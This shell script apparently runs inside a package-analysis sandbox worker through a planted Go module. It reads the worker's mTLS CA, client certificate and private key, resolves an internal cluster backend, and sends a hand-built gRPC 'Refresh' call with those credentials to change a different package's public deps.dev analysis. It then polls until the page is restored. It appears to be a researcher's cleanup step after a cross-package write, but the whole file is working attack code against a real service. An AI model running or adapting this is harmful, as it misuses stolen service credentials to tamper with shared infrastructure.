#!/bin/sh
set -eu

LC_ALL=C
PATH=/usr/bin:/bin
export LC_ALL PATH

emit_byte() {
  byte_octal=$(printf '%03o' "$1")
  printf "\\$byte_octal"
}

emit_varint() {
  varint_value=$1
  while [ "$varint_value" -ge 128 ]; do
    emit_byte $((varint_value % 128 + 128))
    varint_value=$((varint_value / 128))
  done
  emit_byte "$varint_value"
}

emit_u32be() {
  u32_value=$1
  emit_byte $((u32_value >> 24 & 255))
  emit_byte $((u32_value >> 16 & 255))
  emit_byte $((u32_value >> 8 & 255))
  emit_byte $((u32_value & 255))
}

byte_length() {
  printf %s "$1" | wc -c | awk '{print $1}'
}

file_size() {
  wc -c <"$1" | awk '{print $1}'
}

write_grpc_frame() {
  frame_message=$1
  frame_size=$(file_size "$frame_message")
  emit_byte 0
  emit_u32be "$frame_size"
  cat "$frame_message"
}

build_refresh() {
  refresh_output=$1

  # sos.VersionKey: system=GO, kind=VERSION, package, version.
  {
    emit_byte 8
    emit_byte 1
    emit_byte 16
    emit_byte 1
    emit_byte 26
    emit_varint "$(byte_length "$PACKAGE")"
    printf %s "$PACKAGE"
    emit_byte 32
    emit_byte 1
    emit_byte 42
    emit_varint "$(byte_length "$VERSION")"
    printf %s "$VERSION"
  } >"$receipt_dir/version-key.bin"

  {
    emit_byte 10
    emit_varint "$(file_size "$receipt_dir/version-key.bin")"
    cat "$receipt_dir/version-key.bin"
  } >"$receipt_dir/version-key-envelope.bin"

  {
    emit_byte 18
    emit_varint "$(file_size "$receipt_dir/version-key-envelope.bin")"
    cat "$receipt_dir/version-key-envelope.bin"
  } >"$receipt_dir/refresh-request.bin"

  write_grpc_frame "$receipt_dir/refresh-request.bin" >"$refresh_output"
}

grpc_response_ok() {
  grpc_headers=$1
  [ -f "$grpc_headers" ] && [ "$(file_size "$grpc_headers")" -le 16384 ] || return 1
  normalized_headers=$(tr -d '\r' <"$grpc_headers")
  http_total=$(printf '%s\n' "$normalized_headers" | grep -Eic '^HTTP/' || true)
  http_ok=$(printf '%s\n' "$normalized_headers" | grep -Eic '^HTTP/2 200[[:space:]]*$' || true)
  content_type_total=$(printf '%s\n' "$normalized_headers" | grep -Eic '^content-type:' || true)
  content_type_ok=$(printf '%s\n' "$normalized_headers" | grep -Eic '^content-type:[[:space:]]*application/grpc[[:space:]]*$' || true)
  grpc_status_total=$(printf '%s\n' "$normalized_headers" | grep -Eic '^grpc-status:' || true)
  grpc_status_ok=$(printf '%s\n' "$normalized_headers" | grep -Eic '^grpc-status:[[:space:]]*0[[:space:]]*$' || true)
  [ "$http_total" -eq 1 ] && [ "$http_ok" -eq 1 ] &&
    [ "$content_type_total" -eq 1 ] && [ "$content_type_ok" -eq 1 ] &&
    [ "$grpc_status_total" -eq 1 ] && [ "$grpc_status_ok" -eq 1 ]
}

fetch_public() {
  fetch_output=$1
  public_status=$(/usr/bin/curl -q -sS --retry 0 --max-redirs 0 --proto '=https' \
    --connect-timeout 10 --max-time 15 \
    -o "$fetch_output" -w '%{http_code}' "$DEPSDEV_URL" \
    2>>"$receipt_dir/public-curl.err" || true)
  [ -n "$public_status" ] || public_status=000
  public_digest=-
  if [ "$public_status" = 200 ] && [ -s "$fetch_output" ] &&
    [ "$(file_size "$fetch_output")" -le 4096 ]; then
    public_digest=$(sha256sum "$fetch_output" | awk '{print $1}')
  fi
}

poll_clean() {
  poll_elapsed=0
  while [ "$poll_elapsed" -le "$POLL_TIMEOUT" ]; do
    fetch_public "$receipt_dir/public-current.json"
    printf '%s phase=restore status=%s sha256=%s\n' \
      "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$public_status" "$public_digest" |
      tee -a "$receipt_dir/public-poll.log"
    if [ "$public_status" = 200 ] &&
      [ "$public_digest" = "$EXPECTED_BASELINE_SHA256" ]; then
      cp "$receipt_dir/public-current.json" "$receipt_dir/public-restored.json"
      return 0
    fi
    sleep "$POLL_INTERVAL"
    poll_elapsed=$((poll_elapsed + POLL_INTERVAL))
  done
  return 124
}

on_exit() {
  exit_rc=$?
  trap - EXIT HUP INT TERM
  printf 'RECEIPTS=%s\n' "$receipt_dir"
  exit "$exit_rc"
}

prepare_altered_worker() {
  [ "$(id -u)" -eq 0 ] || { printf '%s\n' 'Refusing: not root.' >&2; return 2; }
  pid1_cmdline=$(tr '\000' ' ' </proc/1/cmdline)
  case "$pid1_cmdline" in
    *talisman-worker-capabilities*) ;;
    *) printf '%s\n' 'Refusing: unexpected PID 1.' >&2; return 2 ;;
  esac
  [ "$(pwd -P)" = "/capslock/modcache/$CURRENT" ] || {
    printf '%s\n' 'Refusing: outside exact owned source directory.' >&2
    return 2
  }

  CA='/etc/tls/server-pool/server-tls-pool.pem'
  CERT='/etc/tls/client/tls.crt'
  KEY='/etc/tls/client/tls.key'
  for path in "$CA" "$CERT" "$KEY"; do
    [ -r "$path" ] || { printf '%s\n' 'Refusing: required mTLS file absent.' >&2; return 2; }
  done
  BACKEND_IP=$(/usr/bin/getent ahostsv4 talisman-core.default.svc.cluster.local 2>/dev/null | awk 'NR == 1 {print $1}')
  [ -n "$BACKEND_IP" ] || { printf '%s\n' 'Refusing: backend did not resolve.' >&2; return 2; }
}

send_refresh() {
  build_refresh "$receipt_dir/refresh.bin"
  refresh_request_hash=$(sha256sum "$receipt_dir/refresh.bin" | awk '{print $1}')
  [ "$refresh_request_hash" = "$EXPECTED_REFRESH_SHA256" ] || {
    printf 'Refusing: Refresh frame hash mismatch: %s\n' "$refresh_request_hash" >&2
    return 1
  }
  printf 'REFRESH_TARGET=%s\nREFRESH_REQUEST_SHA256=%s\n' "$TARGET" "$refresh_request_hash"

  if ! /usr/bin/curl -q -sS --retry 0 --max-redirs 0 --proto '=https' \
    --noproxy '*' --http2 --connect-timeout 10 --max-time 30 \
    --resolve "localhost:9000:${BACKEND_IP}" \
    --cacert "$CA" --cert "$CERT" --key "$KEY" \
    -H 'content-type: application/grpc' -H 'te: trailers' \
    --data-binary @"$receipt_dir/refresh.bin" \
    -D "$receipt_dir/refresh.headers" \
    'https://localhost:9000/sos.talisman.Talisman/Refresh' \
    -o "$receipt_dir/refresh.body"; then
    printf '%s\n' 'REFRESH_GRPC_OK=0 (curl failed; not retrying)' >&2
    return 1
  fi
  refresh_body_bytes=$(file_size "$receipt_dir/refresh.body")
  [ "$refresh_body_bytes" -le 4096 ] || {
    printf 'REFRESH_GRPC_OK=0 (oversize body: %s)\n' "$refresh_body_bytes" >&2
    return 1
  }
  grpc_response_ok "$receipt_dir/refresh.headers" || {
    printf '%s\n' 'REFRESH_GRPC_OK=0 (invalid status; not retrying)' >&2
    return 1
  }
  printf 'REFRESH_GRPC_OK=1 body_bytes=%s body_sha256=%s\n' \
    "$refresh_body_bytes" "$(sha256sum "$receipt_dir/refresh.body" | awk '{print $1}')"
}

run_state_machine() {
  fetch_public "$receipt_dir/public-before.json"
  if [ "$public_status" = 200 ] &&
    [ "$public_digest" = "$EXPECTED_BASELINE_SHA256" ]; then
    printf 'NOOP_ALREADY_CLEAN=1 sha256=%s\n' "$public_digest"
    return 0
  fi
  [ "$public_status" = 200 ] &&
    [ "$public_digest" = "$EXPECTED_ALTERED_SHA256" ] || {
      printf 'Refusing: B is neither exact altered nor exact clean state (status=%s sha256=%s).\n' \
        "$public_status" "$public_digest" >&2
      return 1
    }

  prepare_altered_worker
  send_refresh
  poll_clean || {
    printf '%s\n' 'RESTORED=0 (exact baseline not observed)' >&2
    return 1
  }
  printf 'RESTORED=1 baseline_sha256=%s\n' "$EXPECTED_BASELINE_SHA256"
}

main() {
  [ "$#" -eq 0 ] || exit 2

  CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.63-codex'
  TARGET='github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.1'
  PACKAGE=${TARGET%@*}
  VERSION=${TARGET##*@}
  EXPECTED_REFRESH_SHA256='5f5604aff7ef29643b7768e58b3dfdc510e58adcd37e596ac0892b72c733290a'
  EXPECTED_BASELINE_SHA256='bb0f29abd8210aa614a6175e38265532487079bebd25ab94ca21eaaeb13c157c'
  EXPECTED_ALTERED_SHA256='5ec2c29ccadbf5bee106dbc53146bb8c2ec5edd37f573720c4bfabe5ca01efa4'
  POLL_INTERVAL=${POLL_INTERVAL:-5}
  POLL_TIMEOUT=${POLL_TIMEOUT:-900}

  case "$POLL_INTERVAL:$POLL_TIMEOUT" in
    *[!0-9:]*) exit 2 ;;
  esac
  [ "$POLL_INTERVAL" -gt 0 ] && [ "$POLL_TIMEOUT" -gt 0 ] || exit 2
  DEPSDEV_URL='https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.1/analysis'
  receipt_dir=$(mktemp -d /tmp/go-crosspkg-v063-rollback.XXXXXX)
  trap on_exit EXIT
  trap 'exit 129' HUP
  trap 'exit 130' INT
  trap 'exit 143' TERM

  run_state_machine
}

main "$@"
